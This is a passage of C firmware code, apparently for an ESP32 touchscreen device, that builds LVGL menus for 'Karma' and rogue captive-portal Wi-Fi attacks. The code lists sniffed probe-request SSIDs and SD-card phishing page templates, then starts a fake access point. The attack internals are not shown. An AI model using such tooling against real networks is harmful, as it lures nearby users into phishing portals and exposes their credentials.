        karma_disable_log_capture();
        karma_log_ta = NULL;
        karma_stop_btn = NULL;
        karma_info_ssid_label = NULL;
        karma_info_filename_label = NULL;
        karma_ui_active = false;
    }
    
    // Go back to Network Observer and restart sniffing
    sniffer_yes_btn_cb(NULL);
}

static void show_karma_page(void)
{
    create_function_page_base("Karma");
    wifi_attacks_refresh_sd_html_list();

    karma_content = lv_obj_create(function_page);
    lv_obj_set_size(karma_content, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(karma_content, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_opa(karma_content, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(karma_content, 0, 0);
    lv_obj_set_style_pad_all(karma_content, 10, 0);
    lv_obj_set_style_pad_gap(karma_content, 10, 0);
    lv_obj_set_flex_flow(karma_content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(karma_content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);

    // Probe Requests dropdown
    lv_obj_t *probe_label = lv_label_create(karma_content);
    lv_label_set_text(probe_label, "Probe Request SSID:");
    lv_obj_set_style_text_font(probe_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(probe_label, ui_text_color(), 0);

    karma_probe_dd = lv_dropdown_create(karma_content);
    lv_obj_set_width(karma_probe_dd, lv_pct(100));
    lv_dropdown_set_dir(karma_probe_dd, LV_DIR_BOTTOM);
    // Retro terminal styling for dropdown
    lv_obj_set_style_bg_color(karma_probe_dd, ui_bg_color(), LV_PART_MAIN);
    lv_obj_set_style_text_color(karma_probe_dd, ui_text_color(), LV_PART_MAIN);
    lv_obj_set_style_border_color(karma_probe_dd, ui_border_color(), LV_PART_MAIN);
    lv_obj_t *dd_list1 = lv_dropdown_get_list(karma_probe_dd);
    if (dd_list1) {
        lv_obj_set_style_bg_color(dd_list1, ui_bg_color(), 0);
        lv_obj_set_style_text_color(dd_list1, ui_text_color(), 0);
        lv_obj_set_style_border_color(dd_list1, ui_accent_color(), 0);
    }

    // Get probe requests from sniffer
    int probe_count = 0;
    const probe_request_t *probes = wifi_sniffer_get_probes(&probe_count);
    
    // Build probe options
    size_t probe_buf_size = (probe_count > 0 ? probe_count : 1) * 64;
    char *probe_options = (char *)lv_mem_alloc(probe_buf_size);
    if (!probe_options) {
        probe_options = "Run Sniffer first to capture probe requests";
    }

    size_t probe_len = 0;
    if (probe_options != (char *)"Run Sniffer first to capture probe requests") {
        probe_options[0] = '\0';
    }

    int valid_probes = 0;
    memset(karma_probe_index_map, -1, sizeof(karma_probe_index_map));  // Initialize map
    
    for (int i = 0; i < probe_count && i < MAX_PROBE_REQUESTS; i++) {
        if (probes[i].ssid[0] == '\0') {
            continue;  // Skip broadcast probes
        }
        
        // Check if this SSID already exists in the list (skip duplicates)
        bool is_duplicate = false;
        if (probe_options != (char *)"Run Sniffer first to capture probe requests" && probe_len > 0) {
            // Create a temporary copy to search
            char *search_pos = probe_options;
            char search_pattern[65];
            snprintf(search_pattern, sizeof(search_pattern), "%s\n", probes[i].ssid);
            if (strstr(search_pos, search_pattern) != NULL) {
                is_duplicate = true;
            }
        }
        
        if (is_duplicate) {
            continue;  // Skip duplicate SSID
        }
        
        char entry[64];
        snprintf(entry, sizeof(entry), "%s\n", probes[i].ssid);
        size_t entry_len = strlen(entry);
        if (probe_options != (char *)"Run Sniffer first to capture probe requests" && probe_len + entry_len < probe_buf_size) {
            memcpy(probe_options + probe_len, entry, entry_len);
            probe_len += entry_len;
            probe_options[probe_len] = '\0';
            // Map dropdown index to actual probe index
            if (valid_probes < MAX_PROBE_REQUESTS) {
                karma_probe_index_map[valid_probes] = i;
            }
            valid_probes++;
        }
    }
    
    karma_valid_probe_count = valid_probes;  // Save valid probe count

    if (valid_probes == 0) {
        if (probe_options != (char *)"Run Sniffer first to capture probe requests") {
            snprintf(probe_options, probe_buf_size, "Run Sniffer first to capture probe requests");
        }
    }

    lv_dropdown_set_options(karma_probe_dd, probe_options);
    lv_dropdown_set_selected(karma_probe_dd, 0);

    if (probe_options != (char *)"Run Sniffer first to capture probe requests") {
        lv_mem_free(probe_options);
    }

    // HTML dropdown (same as Evil Twin)
    lv_obj_t *html_label = lv_label_create(karma_content);
    lv_label_set_text(html_label, "HTML Portal");
    lv_obj_set_style_text_font(html_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(html_label, ui_text_color(), 0);

    karma_html_dd = lv_dropdown_create(karma_content);
    lv_obj_set_width(karma_html_dd, lv_pct(100));
    lv_dropdown_set_dir(karma_html_dd, LV_DIR_BOTTOM);
    // Retro terminal styling for dropdown
    lv_obj_set_style_bg_color(karma_html_dd, ui_bg_color(), LV_PART_MAIN);
    lv_obj_set_style_text_color(karma_html_dd, ui_text_color(), LV_PART_MAIN);
    lv_obj_set_style_border_color(karma_html_dd, ui_border_color(), LV_PART_MAIN);
    lv_obj_t *dd_list2 = lv_dropdown_get_list(karma_html_dd);
    if (dd_list2) {
        lv_obj_set_style_bg_color(dd_list2, ui_bg_color(), 0);
        lv_obj_set_style_text_color(dd_list2, ui_text_color(), 0);
        lv_obj_set_style_border_color(dd_list2, ui_accent_color(), 0);
    }

    int html_total = wifi_attacks_get_sd_html_count();
    size_t max_html = (html_total < SCAN_RESULTS_MAX_DISPLAY) ? html_total : SCAN_RESULTS_MAX_DISPLAY;
    size_t html_buf_size = (max_html > 0 ? max_html : 1) * 64;
    char *html_options = (char *)lv_mem_alloc(html_buf_size);
    if (!html_options) {
        html_options = "No HTML templates";
        max_html = 0;
    }

    size_t html_len = 0;
    if (html_options != (char *)"No HTML templates") {
        html_options[0] = '\0';
    }

    int evil_twin_html_count = 0;
    for (int i = 0; i < html_total && i < SCAN_RESULTS_MAX_DISPLAY; i++) {
        const char *name = wifi_attacks_get_sd_html_name(i);
        if (!name) {
            continue;
        }
        char entry[64];
        const char *display = strrchr(name, '/');
        if (display) {
            display++;
        } else {
            display = name;
        }
        snprintf(entry, sizeof(entry), "%s\n", display);
        size_t entry_len = strlen(entry);
        if (html_options != (char *)"No HTML templates" && html_len + entry_len < html_buf_size) {
            memcpy(html_options + html_len, entry, entry_len);
            html_len += entry_len;
            html_options[html_len] = '\0';
            evil_twin_html_count++;
        }
    }

    if (evil_twin_html_count == 0) {
        if (html_options != (char *)"No HTML templates") {
            snprintf(html_options, html_buf_size, "No HTML templates");
        }
    }

    lv_dropdown_set_options(karma_html_dd, html_options);
    lv_dropdown_set_selected(karma_html_dd, 0);

    if (html_options != (char *)"No HTML templates") {
        lv_mem_free(html_options);
    }

    // Button row for Start Karma + Back To Observer
    lv_obj_t *karma_btn_row = lv_obj_create(karma_content);
    lv_obj_set_size(karma_btn_row, lv_pct(100), 45);
    lv_obj_set_style_bg_opa(karma_btn_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(karma_btn_row, 0, 0);
    lv_obj_set_style_pad_all(karma_btn_row, 0, 0);
    lv_obj_set_style_pad_gap(karma_btn_row, 10, 0);
    lv_obj_set_flex_flow(karma_btn_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(karma_btn_row, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(karma_btn_row, LV_OBJ_FLAG_SCROLLABLE);

    // Start Karma button
    karma_start_btn = lv_btn_create(karma_btn_row);
    lv_obj_set_size(karma_start_btn, 140, 35);
    lv_obj_set_style_bg_color(karma_start_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(karma_start_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(karma_start_btn, 0, 0);
    lv_obj_set_style_radius(karma_start_btn, 8, 0);
    lv_obj_add_event_cb(karma_start_btn, karma_start_btn_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *start_label = lv_label_create(karma_start_btn);
    lv_label_set_text(start_label, "Start Karma");
    lv_obj_set_style_text_color(start_label, ui_text_color(), 0);
    lv_obj_center(start_label);

    // Disable button if no probes or no HTML
    if (valid_probes == 0 || evil_twin_html_count == 0) {
        lv_obj_add_state(karma_start_btn, LV_STATE_DISABLED);
    }

    // Back To Observer button
    lv_obj_t *back_obs_btn = lv_btn_create(karma_btn_row);
    lv_obj_set_size(back_obs_btn, 160, 35);
    lv_obj_set_style_bg_color(back_obs_btn, COLOR_MATERIAL_TEAL, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(back_obs_btn, lv_color_lighten(COLOR_MATERIAL_TEAL, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(back_obs_btn, 0, 0);
    lv_obj_set_style_radius(back_obs_btn, 8, 0);
    lv_obj_add_event_cb(back_obs_btn, karma_back_to_observer_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *back_obs_label = lv_label_create(back_obs_btn);
    lv_label_set_text(back_obs_label, "Back To Observer");
    lv_obj_set_style_text_color(back_obs_label, ui_text_color(), 0);
    lv_obj_center(back_obs_label);
}

static void karma_start_btn_cb(lv_event_t *e)
{
    (void)e;

    if (!karma_probe_dd || !karma_html_dd) {
        return;
    }

    // Get selected dropdown indices
    int probe_sel = lv_dropdown_get_selected(karma_probe_dd);
    int html_sel = lv_dropdown_get_selected(karma_html_dd);

    int probe_count = 0;
    const probe_request_t *probes = wifi_sniffer_get_probes(&probe_count);
    
    if (!probes || probe_count == 0) {
        ESP_LOGW(TAG, "No probe requests available");
        return;
    }

    // Use pre-calculated mapping to get actual probe index
    if (probe_sel < 0 || probe_sel >= karma_valid_probe_count) {
        ESP_LOGW(TAG, "Invalid probe selection: %d (valid count: %d)", probe_sel, karma_valid_probe_count);
        return;
    }

    int actual_probe_index = karma_probe_index_map[probe_sel];
    if (actual_probe_index < 0 || actual_probe_index >= probe_count) {
        ESP_LOGW(TAG, "Invalid actual probe index: %d", actual_probe_index);
        return;
    }

    const char *selected_ssid = (const char *)probes[actual_probe_index].ssid;
    if (!selected_ssid || selected_ssid[0] == '\0') {
        ESP_LOGW(TAG, "Selected probe SSID is empty");
        return;
    }

    // Get HTML file
    int html_count = wifi_attacks_get_sd_html_count();
    if (html_sel < 0 || html_sel >= html_count) {
        ESP_LOGW(TAG, "Invalid HTML selection");
        return;
    }

    const char *html_name = wifi_attacks_get_sd_html_name(html_sel);
    
    // Save selected SSID and HTML name for display
    strncpy(karma_selected_ssid, selected_ssid, sizeof(karma_selected_ssid) - 1);
    karma_selected_ssid[sizeof(karma_selected_ssid) - 1] = '\0';
    
    if (html_name) {
        const char *short_name = strrchr(html_name, '/');
        if (short_name) {
            short_name++;
        } else {
            short_name = html_name;
        }
        strncpy(karma_selected_html_name, short_name, sizeof(karma_selected_html_name) - 1);
        karma_selected_html_name[sizeof(karma_selected_html_name) - 1] = '\0';
    } else {
        strcpy(karma_selected_html_name, "default");
    }

    ESP_LOGI(TAG, "Starting Karma for SSID: %s", selected_ssid);

    // Select HTML template
    if (html_name) {
        esp_err_t html_res = wifi_attacks_select_sd_html(html_sel);
        if (html_res != ESP_OK) {
            ESP_LOGW(TAG, "Failed to set portal template: %s", esp_err_to_name(html_res));
        }
    }

    // Create Karma Running page (Portal-style UI)
    create_function_page_base("Karma");

    // Content container below title bar (leave space for button at bottom)
    lv_obj_t *content = lv_obj_create(function_page);
    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30 - 70);  // Leave 70px for button
    lv_obj_align(content, LV_ALIGN_TOP_MID, 0, 30);  // Start below title bar
    lv_obj_set_style_bg_opa(content, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(content, 0, 0);
    lv_obj_set_style_pad_all(content, 8, 0);
    lv_obj_set_style_pad_gap(content, 4, 0);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);

    // SSID label
    karma_info_ssid_label = lv_label_create(content);
    char ssid_text[64];
    snprintf(ssid_text, sizeof(ssid_text), "SSID: %s", karma_selected_ssid);
    lv_label_set_text(karma_info_ssid_label, ssid_text);
    lv_obj_set_style_text_font(karma_info_ssid_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(karma_info_ssid_label, ui_text_color(), 0);

    // Filename label
    karma_info_filename_label = lv_label_create(content);
    char filename_text[96];
    snprintf(filename_text, sizeof(filename_text), "File: %s", karma_selected_html_name);
    lv_label_set_text(karma_info_filename_label, filename_text);
    lv_obj_set_style_text_font(karma_info_filename_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(karma_info_filename_label, ui_text_color(), 0);

    // Events label
    lv_obj_t *events_label = lv_label_create(content);
    lv_label_set_text(events_label, "Events:");
    lv_obj_set_style_text_font(events_label, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(events_label, lv_color_make(150, 150, 150), 0);

    // Events textarea (scrollable)
    karma_log_ta = lv_textarea_create(content);
    lv_obj_set_width(karma_log_ta, lv_pct(100));
    lv_obj_set_flex_grow(karma_log_ta, 1);  // Take remaining space
    lv_textarea_set_one_line(karma_log_ta, false);
    lv_textarea_set_cursor_click_pos(karma_log_ta, false);
    lv_textarea_set_password_mode(karma_log_ta, false);
    lv_textarea_set_text(karma_log_ta, "");
    lv_obj_set_style_bg_color(karma_log_ta, ui_bg_color(), 0);
    lv_obj_set_style_text_color(karma_log_ta, ui_text_color(), 0);
    lv_obj_set_style_border_color(karma_log_ta, ui_accent_color(), 0);
    lv_obj_set_style_border_width(karma_log_ta, 1, 0);
    lv_obj_set_style_text_font(karma_log_ta, &lv_font_montserrat_12, 0);

    // Red Stop button at the bottom (styled like Portal)
    karma_stop_btn = lv_btn_create(function_page);
    lv_obj_set_size(karma_stop_btn, 120, 55);
    lv_obj_align(karma_stop_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(karma_stop_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(karma_stop_btn, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(karma_stop_btn, 0, 0);
    lv_obj_set_style_radius(karma_stop_btn, 10, 0);
    lv_obj_set_style_shadow_width(karma_stop_btn, 6, 0);
    lv_obj_set_style_shadow_color(karma_stop_btn, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(karma_stop_btn, LV_OPA_40, 0);
    lv_obj_set_flex_flow(karma_stop_btn, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(karma_stop_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_add_event_cb(karma_stop_btn, karma_stop_btn_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *stop_icon = lv_label_create(karma_stop_btn);
    lv_label_set_text(stop_icon, LV_SYMBOL_STOP);
    lv_obj_set_style_text_font(stop_icon, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(stop_icon, ui_text_color(), 0);

    lv_obj_t *stop_label = lv_label_create(karma_stop_btn);
    lv_label_set_text(stop_label, "Stop");
    lv_obj_set_style_text_font(stop_label, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(stop_label, ui_text_color(), 0);

    // Set UI active flag
    karma_ui_active = true;

    // Create event queue for UI updates
    if (!karma_event_queue) {
        karma_event_queue = xQueueCreate(10, sizeof(evil_twin_event_data_t));
    }

    // Register event callback for karma events
    wifi_attacks_set_evil_twin_event_cb(karma_ui_event_callback);

    // Start portal with the selected SSID
    esp_err_t start_res = wifi_attacks_start_portal(selected_ssid);
    if (start_res != ESP_OK) {
        char err[96];
        snprintf(err, sizeof(err), "Start failed: %s\n", esp_err_to_name(start_res));
        lv_textarea_add_text(karma_log_ta, err);
        wifi_attacks_set_evil_twin_event_cb(NULL);
        karma_ui_active = false;
        return;
    }

    // Add initial "Karma Started" event
    lv_textarea_add_text(karma_log_ta, "Karma Started\n");
    lv_textarea_set_cursor_pos(karma_log_ta, LV_TEXTAREA_CURSOR_LAST);

    ESP_LOGI(TAG, "Karma started successfully");
}

static void karma_stop_btn_cb(lv_event_t *e)
{
    (void)e;
    
    ESP_LOGI(TAG, "Stopping Karma...");
    
    // Stop the portal
    wifi_attacks_stop_portal();
    
    // Unregister event callback
    wifi_attacks_set_evil_twin_event_cb(NULL);
    
    // Reset UI state
    karma_log_ta = NULL;
    karma_stop_btn = NULL;
    karma_info_ssid_label = NULL;
    karma_info_filename_label = NULL;
    karma_ui_active = false;
    
    nav_to_menu_flag = true;
}

static void portal_ssid_ta_event_cb(lv_event_t *e)
{
    (void)e;
    // Show keyboard when text area is clicked
    if (portal_keyboard) {
        lv_obj_clear_flag(portal_keyboard, LV_OBJ_FLAG_HIDDEN);
        ESP_LOGI(TAG, "Keyboard shown");
    }
}

static void portal_keyboard_event_cb(lv_event_t *e)
{
    lv_event_code_t code = lv_event_get_code(e);
    lv_obj_t *ta = lv_event_get_user_data(e);
    
    if (code == LV_EVENT_VALUE_CHANGED) {
        // Update buffer when text changes
        const char *txt = lv_textarea_get_text(ta);
        if (txt) {
            strncpy(portal_ssid_buffer, txt, sizeof(portal_ssid_buffer) - 1);
            portal_ssid_buffer[sizeof(portal_ssid_buffer) - 1] = '\0';
        }
    }
    else if (code == LV_EVENT_READY || code == LV_EVENT_CANCEL) {
        // Hide keyboard when "Close" button is pressed
        if (portal_keyboard) {
            lv_obj_add_flag(portal_keyboard, LV_OBJ_FLAG_HIDDEN);
            ESP_LOGI(TAG, "Keyboard hidden");
        }
    }
}

static void show_portal_page(void)
{
    create_function_page_base("Portal");
    wifi_attacks_refresh_sd_html_list();

    portal_content = lv_obj_create(function_page);
    lv_obj_set_size(portal_content, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(portal_content, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_opa(portal_content, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(portal_content, 0, 0);
    lv_obj_set_style_pad_all(portal_content, 10, 0);
    lv_obj_set_style_pad_gap(portal_content, 10, 0);
    lv_obj_set_flex_flow(portal_content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(portal_content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);

    // SSID text area with keyboard
    lv_obj_t *ssid_label = lv_label_create(portal_content);
    lv_label_set_text(ssid_label, "Portal SSID:");
    lv_obj_set_style_text_font(ssid_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(ssid_label, ui_text_color(), 0);

    portal_ssid_ta = lv_textarea_create(portal_content);
    lv_obj_set_width(portal_ssid_ta, lv_pct(100));
    lv_textarea_set_one_line(portal_ssid_ta, true);
    lv_textarea_set_text(portal_ssid_ta, portal_ssid_buffer);
    lv_obj_set_style_bg_color(portal_ssid_ta, ui_bg_color(), 0);
    lv_obj_set_style_text_color(portal_ssid_ta, ui_text_color(), 0);
    lv_obj_set_style_border_color(portal_ssid_ta, ui_accent_color(), 0);
    
    // Add event to show keyboard when text area is clicked
    lv_obj_add_event_cb(portal_ssid_ta, portal_ssid_ta_event_cb, LV_EVENT_CLICKED, NULL);

    // Create keyboard with close button
    portal_keyboard = lv_keyboard_create(function_page);
    lv_keyboard_set_textarea(portal_keyboard, portal_ssid_ta);
    lv_keyboard_set_mode(portal_keyboard, LV_KEYBOARD_MODE_TEXT_LOWER);  // Text mode with close button
    lv_obj_set_size(portal_keyboard, lv_pct(100), lv_pct(40));
    lv_obj_align(portal_keyboard, LV_ALIGN_BOTTOM_MID, 0, 0);
    
    // Keyboard background - black
    lv_obj_set_style_bg_color(portal_keyboard, ui_bg_color(), LV_PART_MAIN);
    lv_obj_set_style_text_color(portal_keyboard, ui_text_color(), LV_PART_MAIN);
    
    // Keyboard buttons - green with black background
    lv_obj_set_style_bg_color(portal_keyboard, lv_color_make(0, 100, 0), LV_PART_ITEMS);  // Dark green buttons
    lv_obj_set_style_bg_color(portal_keyboard, lv_color_make(0, 150, 0), LV_PART_ITEMS | LV_STATE_PRESSED);  // Lighter green when pressed
    lv_obj_set_style_text_color(portal_keyboard, ui_text_color(), LV_PART_ITEMS);
    lv_obj_set_style_border_color(portal_keyboard, ui_border_color(), LV_PART_ITEMS);
    lv_obj_set_style_border_width(portal_keyboard, 1, LV_PART_ITEMS);
    
    lv_obj_add_event_cb(portal_keyboard, portal_keyboard_event_cb, LV_EVENT_VALUE_CHANGED, portal_ssid_ta);
    
    // Add event to hide keyboard when "Close" (OK) button is pressed
    lv_obj_add_event_cb(portal_keyboard, portal_keyboard_event_cb, LV_EVENT_READY, portal_ssid_ta);

    // HTML dropdown
    lv_obj_t *html_label = lv_label_create(portal_content);
    lv_label_set_text(html_label, "HTML Portal");
    lv_obj_set_style_text_font(html_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(html_label, ui_text_color(), 0);

    portal_html_dd = lv_dropdown_create(portal_content);
    lv_obj_set_width(portal_html_dd, lv_pct(100));
    lv_dropdown_set_dir(portal_html_dd, LV_DIR_BOTTOM);
    // Retro terminal styling for dropdown
    lv_obj_set_style_bg_color(portal_html_dd, ui_bg_color(), LV_PART_MAIN);
    lv_obj_set_style_text_color(portal_html_dd, ui_text_color(), LV_PART_MAIN);
    lv_obj_set_style_border_color(portal_html_dd, ui_border_color(), LV_PART_MAIN);
    lv_obj_t *dd_list = lv_dropdown_get_list(portal_html_dd);
    if (dd_list) {
        lv_obj_set_style_bg_color(dd_list, ui_bg_color(), 0);
        lv_obj_set_style_text_color(dd_list, ui_text_color(), 0);
        lv_obj_set_style_border_color(dd_list, ui_accent_color(), 0);
    }

    int html_total = wifi_attacks_get_sd_html_count();
    size_t max_html = (html_total < SCAN_RESULTS_MAX_DISPLAY) ? html_total : SCAN_RESULTS_MAX_DISPLAY;
    size_t html_buf_size = (max_html > 0 ? max_html : 1) * 64;
    char *html_options = (char *)lv_mem_alloc(html_buf_size);
    if (!html_options) {
        html_options = "No HTML templates";
        max_html = 0;
    }

    size_t html_len = 0;
    if (html_options != (char *)"No HTML templates") {
        html_options[0] = '\0';
    }

    int portal_html_count = 0;
    for (int i = 0; i < html_total && i < SCAN_RESULTS_MAX_DISPLAY; i++) {
        const char *name = wifi_attacks_get_sd_html_name(i);
        if (!name) {
            continue;
        }
        char entry[64];
        const char *display = strrchr(name, '/');
        if (display) {
            display++;
        } else {
            display = name;
        }
        snprintf(entry, sizeof(entry), "%s\n", display);
        size_t entry_len = strlen(entry);
        if (html_options != (char *)"No HTML templates" && html_len + entry_len < html_buf_size) {
            memcpy(html_options + html_len, entry, entry_len);
            html_len += entry_len;
            html_options[html_len] = '\0';
            portal_html_count++;
        }
    }

    if (portal_html_count == 0) {
        if (html_options != (char *)"No HTML templates") {
            snprintf(html_options, html_buf_size, "No HTML templates");
        }
    }

    lv_dropdown_set_options(portal_html_dd, html_options);
    lv_dropdown_set_selected(portal_html_dd, 0);

    if (html_options != (char *)"No HTML templates") {
        lv_mem_free(html_options);
    }

    // Start Portal button
    portal_start_btn = lv_btn_create(portal_content);
    lv_obj_set_size(portal_start_btn, 140, 35);
    lv_obj_set_style_bg_color(portal_start_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(portal_start_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(portal_start_btn, 0, 0);
    lv_obj_set_style_radius(portal_start_btn, 8, 0);
    lv_obj_add_event_cb(portal_start_btn, portal_start_btn_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *start_label = lv_label_create(portal_start_btn);
    lv_label_set_text(start_label, "Start Portal");
    lv_obj_set_style_text_color(start_label, ui_text_color(), 0);
    lv_obj_center(start_label);

    // Disable button if no HTML
    if (portal_html_count == 0) {
        lv_obj_add_state(portal_start_btn, LV_STATE_DISABLED);
    }
}

static void portal_start_btn_cb(lv_event_t *e)
{
    (void)e;

    if (!portal_ssid_ta || !portal_html_dd) {
        return;
    }

    // Get SSID from text area
    const char *ssid = lv_textarea_get_text(portal_ssid_ta);
    if (!ssid || strlen(ssid) == 0) {
        ESP_LOGW(TAG, "Portal SSID cannot be empty");
        return;
    }

    // Update buffer
    strncpy(portal_ssid_buffer, ssid, sizeof(portal_ssid_buffer) - 1);
    portal_ssid_buffer[sizeof(portal_ssid_buffer) - 1] = '\0';

    // Get HTML file
    int html_sel = lv_dropdown_get_selected(portal_html_dd);
    int html_count = wifi_attacks_get_sd_html_count();
    if (html_sel < 0 || html_sel >= html_count) {
        ESP_LOGW(TAG, "Invalid HTML selection");
        return;
    }

    const char *html_name = wifi_attacks_get_sd_html_name(html_sel);
    
    // Save the HTML filename for display
    if (html_name) {
        const char *short_name = strrchr(html_name, '/');
        if (short_name) {
            short_name++;
        } else {
            short_name = html_name;
        }
        strncpy(portal_selected_html_name, short_name, sizeof(portal_selected_html_name) - 1);
        portal_selected_html_name[sizeof(portal_selected_html_name) - 1] = '\0';
    } else {
        strcpy(portal_selected_html_name, "default");
    }

    ESP_LOGI(TAG, "Starting Portal with SSID: %s", portal_ssid_buffer);

    // Hide keyboard before creating new page
    if (portal_keyboard) {
        lv_obj_del(portal_keyboard);
        portal_keyboard = NULL;
    }

    // Select HTML template
    if (html_name) {
        esp_err_t html_res = wifi_attacks_select_sd_html(html_sel);
        if (html_res != ESP_OK) {
            ESP_LOGW(TAG, "Failed to set portal template: %s", esp_err_to_name(html_res));
        }
    }

    // Create Portal Running page
    create_function_page_base("Portal");

    // Content container below title bar (leave space for button at bottom)
    lv_obj_t *content = lv_obj_create(function_page);
    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30 - 70);  // Leave 70px for button
    lv_obj_align(content, LV_ALIGN_TOP_MID, 0, 30);  // Start below title bar
    lv_obj_set_style_bg_opa(content, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(content, 0, 0);
    lv_obj_set_style_pad_all(content, 8, 0);
    lv_obj_set_style_pad_gap(content, 4, 0);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);

    // SSID label
    portal_info_ssid_label = lv_label_create(content);
    char ssid_text[64];
    snprintf(ssid_text, sizeof(ssid_text), "SSID: %s", portal_ssid_buffer);
    lv_label_set_text(portal_info_ssid_label, ssid_text);
    lv_obj_set_style_text_font(portal_info_ssid_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(portal_info_ssid_label, ui_text_color(), 0);

    // Filename label
    portal_info_filename_label = lv_label_create(content);
    char filename_text[96];
    snprintf(filename_text, sizeof(filename_text), "File: %s", portal_selected_html_name);
    lv_label_set_text(portal_info_filename_label, filename_text);
    lv_obj_set_style_text_font(portal_info_filename_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(portal_info_filename_label, ui_text_color(), 0);

    // Events label
    lv_obj_t *events_label = lv_label_create(content);
    lv_label_set_text(events_label, "Events:");
    lv_obj_set_style_text_font(events_label, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(events_label, lv_color_make(150, 150, 150), 0);

    // Events textarea (scrollable)
    portal_log_ta = lv_textarea_create(content);
    lv_obj_set_width(portal_log_ta, lv_pct(100));
    lv_obj_set_flex_grow(portal_log_ta, 1);  // Take remaining space
    lv_textarea_set_one_line(portal_log_ta, false);
    lv_textarea_set_cursor_click_pos(portal_log_ta, false);
    lv_textarea_set_password_mode(portal_log_ta, false);
    lv_textarea_set_text(portal_log_ta, "");
    lv_obj_set_style_bg_color(portal_log_ta, ui_bg_color(), 0);
    lv_obj_set_style_text_color(portal_log_ta, ui_text_color(), 0);
    lv_obj_set_style_border_color(portal_log_ta, ui_accent_color(), 0);
    lv_obj_set_style_border_width(portal_log_ta, 1, 0);
    lv_obj_set_style_text_font(portal_log_ta, &lv_font_montserrat_12, 0);

    // Red Stop button at the bottom (styled like BT Locator)
    portal_stop_btn = lv_btn_create(function_page);
    lv_obj_set_size(portal_stop_btn, 120, 55);
    lv_obj_align(portal_stop_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(portal_stop_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(portal_stop_btn, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(portal_stop_btn, 0, 0);
    lv_obj_set_style_radius(portal_stop_btn, 10, 0);
    lv_obj_set_style_shadow_width(portal_stop_btn, 6, 0);
    lv_obj_set_style_shadow_color(portal_stop_btn, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(portal_stop_btn, LV_OPA_40, 0);
    lv_obj_set_flex_flow(portal_stop_btn, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(portal_stop_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_add_event_cb(portal_stop_btn, portal_stop_btn_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *stop_icon = lv_label_create(portal_stop_btn);
    lv_label_set_text(stop_icon, LV_SYMBOL_STOP);
    lv_obj_set_style_text_font(stop_icon, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(stop_icon, ui_text_color(), 0);

    lv_obj_t *stop_label = lv_label_create(portal_stop_btn);
